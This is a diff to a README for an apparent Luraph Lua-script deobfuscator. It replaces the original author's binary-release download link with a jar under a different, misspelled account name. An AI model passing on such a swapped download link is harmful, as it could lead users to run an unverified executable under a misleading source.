@@ -4,7 +4,7 @@ Automatically deobfuscate Luraph scripts. Tested on Luraph scripts between v11.5
 Requires Java 8 to run.
 
 # Binary Release (Version 1.0.0)
-https://github.com/TheGreatSageEqualToHeaven/LuraphDeobfuscator/releases/download/v1.0.0/LuraphDevirtualizer.jar
+https://github.com/stangithuboffical/LuraphDeobfuscator/releases/download/v1.0.0/LuraphDeobfuscator.jar
 
 # Discord Group
 Come discuss this project in my Lua discord 
